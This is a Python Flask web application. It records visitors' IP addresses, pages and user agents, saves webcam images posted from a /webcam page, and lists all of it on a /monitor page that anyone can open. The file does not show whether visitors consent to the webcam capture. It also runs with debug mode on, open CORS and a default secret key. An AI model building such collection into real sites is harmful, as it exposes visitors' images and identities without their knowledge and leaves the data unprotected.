from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# Database configuration
DB_USER = os.environ.get('DB_USER', 'your_db_user')
DB_PASSWORD = os.environ.get('DB_PASSWORD', 'your_db_password')
DB_HOST = os.environ.get('DB_HOST', 'localhost')
DB_NAME = os.environ.get('DB_NAME', 'your_db_name')

# MySQL connection string
app.config['SQLALCHEMY_DATABASE_URI'] = f'mysql://{DB_USER}:{DB_PASSWORD}@{DB_HOST}/{DB_NAME}'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-key-change-this')
db = SQLAlchemy(app)

class Visitor(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(50), nullable=False)
    page_url = db.Column(db.String(200), nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)
    user_agent = db.Column(db.String(200))

class WebcamCapture(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(50), nullable=False)
    image_data = db.Column(db.Text, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.utcnow)

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/monitor')
def monitor():
    visitors = Visitor.query.order_by(Visitor.timestamp.desc()).all()
    captures = WebcamCapture.query.order_by(WebcamCapture.timestamp.desc()).all()
    return render_template('monitor.html', visitors=visitors, captures=captures)

@app.route('/webcam')
def webcam():
    return render_template('webcam.html')

@app.route('/record_visit')
def record_visit():
    ip_address = request.remote_addr
    page_url = request.args.get('page', '')
    user_agent = request.headers.get('User-Agent')
    
    visitor = Visitor(
        ip_address=ip_address,
        page_url=page_url,
        user_agent=user_agent
    )
    db.session.add(visitor)
    db.session.commit()
    return jsonify({"status": "success"})

@app.route('/save_capture', methods=['POST'])
def save_capture():
    ip_address = request.remote_addr
    image_data = request.json.get('image_data', '')
    
    capture = WebcamCapture(
        ip_address=ip_address,
        image_data=image_data
    )
    db.session.add(capture)
    db.session.commit()
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)
